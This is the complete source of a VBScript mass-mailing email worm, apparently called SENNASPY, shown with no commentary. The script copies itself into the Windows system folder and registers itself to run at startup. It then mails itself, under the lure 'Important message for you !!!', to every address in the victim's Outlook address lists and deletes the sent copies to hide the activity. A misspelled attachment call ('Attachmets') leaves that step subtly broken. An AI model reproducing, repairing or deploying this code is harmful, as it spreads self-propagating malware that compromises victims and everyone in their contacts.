   ' EMM

   On Error Resume Next

   Dim A01
   Dim A02
   Dim A06
   Dim A07
   Dim A05
   Dim A09
   Dim A10

   Set A01 = CreateObject( "Scripting.FileSystemObject" )
   A01.CopyFile WScript.ScriptFullName, A01.BuildPath( A01.GetSpecialFolder(1), "SENNASPY.VBS" )

   Set A02 = CreateObject( "WScript.Shell" )
   A02.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "SENNASPY", A01.BuildPath( A01.GetSpecialFolder(1), "SENNASPY.VBS" )

   A04 = A02.RegRead( "HKEY_LOCAL_MACHINE\" & "SENNASPY" )

   If A04 = "" Or A04 > 20 Then
      A04 = 0
   End If

   If A04 = 0 Then
      Set A05 = CreateObject( "Outlook.Application" )
      Set A06 = A05.GetNameSpace( "MAPI" )

      For Each A07 In A06.AddressLists
          Set A08 = A05.CreateItem( 0 )

          For A09 = 1 To A07.AddressEntries.Count
              Set A10 = A07.AddressEntries( A09 )

              If A09 = 1 Then
                 A08.BCC = A10.Address
              Else
                 A08.BCC = A08.BCC & "; " & A10.Address
              End If
          Next

          A08.Subject = "Hey you !!!"
          A08.Body = "Important message for you !!!"
          A08.Attachmets.Add WScript.ScriptFullName
          A08.DeleteAfterSubmit = True
          A08.Send
      Next

      A04 = 0
   End If

   A02.RegWrite "HKEY_LOCAL_MACHINE\" & "SENNASPY", A04 + 1
